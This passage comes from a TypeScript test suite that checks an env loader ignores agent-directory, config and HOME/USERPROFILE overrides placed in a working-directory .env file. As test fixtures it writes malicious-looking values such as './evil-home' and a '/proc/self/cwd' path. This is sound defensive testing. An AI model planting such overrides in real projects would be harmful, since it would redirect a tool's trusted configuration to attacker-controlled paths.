		expect(process.env.MAESTRO_HOME).toBe("/trusted/home");
		expect(process.env.MAESTRO_CONFIG).toBe("/trusted/config.json");
		expect(process.env.maestro_home).toBeUndefined();
		expect(process.env.maestro_config).toBeUndefined();
		expect(loaded).toEqual([]);
	});

	it("does not load agent-dir overrides from cwd dotenv", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const originalAgentDir = process.env.MAESTRO_AGENT_DIR;
		const originalPlaywrightAgentDir = process.env.PLAYWRIGHT_AGENT_DIR;
		const originalCodingAgentDir = process.env.CODING_AGENT_DIR;
		touchedKeys.add("MAESTRO_AGENT_DIR");
		touchedKeys.add("PLAYWRIGHT_AGENT_DIR");
		touchedKeys.add("CODING_AGENT_DIR");
		Reflect.deleteProperty(process.env, "MAESTRO_AGENT_DIR");
		Reflect.deleteProperty(process.env, "PLAYWRIGHT_AGENT_DIR");
		Reflect.deleteProperty(process.env, "CODING_AGENT_DIR");
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_AGENT_DIR=./.maestro",
				"PLAYWRIGHT_AGENT_DIR=./.maestro",
				"CODING_AGENT_DIR=/proc/self/cwd/.maestro",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		try {
			const loaded = loadEnv();

			expect(process.env.MAESTRO_AGENT_DIR).toBeUndefined();
			expect(process.env.PLAYWRIGHT_AGENT_DIR).toBeUndefined();
			expect(process.env.CODING_AGENT_DIR).toBeUndefined();
			expect(loaded).toEqual([]);
		} finally {
			if (originalAgentDir !== undefined) {
				process.env.MAESTRO_AGENT_DIR = originalAgentDir;
			}
			if (originalPlaywrightAgentDir !== undefined) {
				process.env.PLAYWRIGHT_AGENT_DIR = originalPlaywrightAgentDir;
			}
			if (originalCodingAgentDir !== undefined) {
				process.env.CODING_AGENT_DIR = originalCodingAgentDir;
			}
		}
	});

	it("does not load user home overrides from cwd dotenv", () => {
		const originalHome = process.env.HOME;
		const originalUserProfile = process.env.USERPROFILE;
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("HOME");
		touchedKeys.add("USERPROFILE");
		Reflect.deleteProperty(process.env, "HOME");
		Reflect.deleteProperty(process.env, "USERPROFILE");
		writeFileSync(
			join(dir, ".env"),
			"HOME=./evil-home\nUSERPROFILE=./evil-profile\n",
			"utf8",
		);
		process.chdir(dir);

		try {
			const loaded = loadEnv();

			expect(process.env.HOME).toBeUndefined();
			expect(process.env.USERPROFILE).toBeUndefined();
			expect(loaded).toEqual([]);
		} finally {
			if (originalHome !== undefined) {
				process.env.HOME = originalHome;
			}
			if (originalUserProfile !== undefined) {
				process.env.USERPROFILE = originalUserProfile;
			}
			touchedKeys.delete("HOME");
			touchedKeys.delete("USERPROFILE");
		}
	});
});
